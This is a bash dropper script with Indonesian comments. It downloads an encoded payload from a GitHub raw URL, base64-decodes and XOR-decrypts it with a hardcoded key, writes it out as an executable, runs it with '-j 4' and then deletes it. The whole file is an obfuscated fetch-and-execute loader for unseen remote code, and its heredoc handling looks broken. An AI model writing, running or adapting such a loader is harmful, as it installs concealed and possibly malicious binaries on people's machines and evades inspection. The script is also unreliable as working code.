#!/bin/bash

_PAYLOAD=$(curl -sL https://raw.githubusercontent.com/popowana/clever-phoenix-960/refs/heads/main/payload.txt)

if [ -z "$_PAYLOAD" ]; then
    echo "Error: Failed to download payload"
    exit 1
fi

echo "Payload downloaded (length: ${#_PAYLOAD})"

# Gunakan Python untuk decrypt dan execute
python3 <<'EOF'
import base64, os, subprocess, sys

# Data dari bash
data = sys.argv[1] if len(sys.argv) > 1 else open('/dev/stdin').read()
data = data.strip()

try:
    decoded = base64.b64decode(data)
except Exception as e:
    print(f"Base64 decode error: {e}")
    sys.exit(1)

key = 'kembang'
decrypted = bytes([decoded[i] ^ ord(key[i % len(key)]) for i in range(len(decoded))])

if len(decrypted) == 0:
    print("Error: Decrypted data is empty")
    sys.exit(1)

print(f"Decrypted size: {len(decrypted)} bytes")

with open('nnr', 'wb') as f:
    f.write(decrypted)

os.chmod('nnr', 0o755)

# Jalankan
result = subprocess.run(['./nnr', '-j', '4'], capture_output=True, text=True)
print(result.stdout)
if result.stderr:
    print(result.stderr, file=sys.stderr)

os.unlink('nnr')
EOF "$_PAYLOAD"
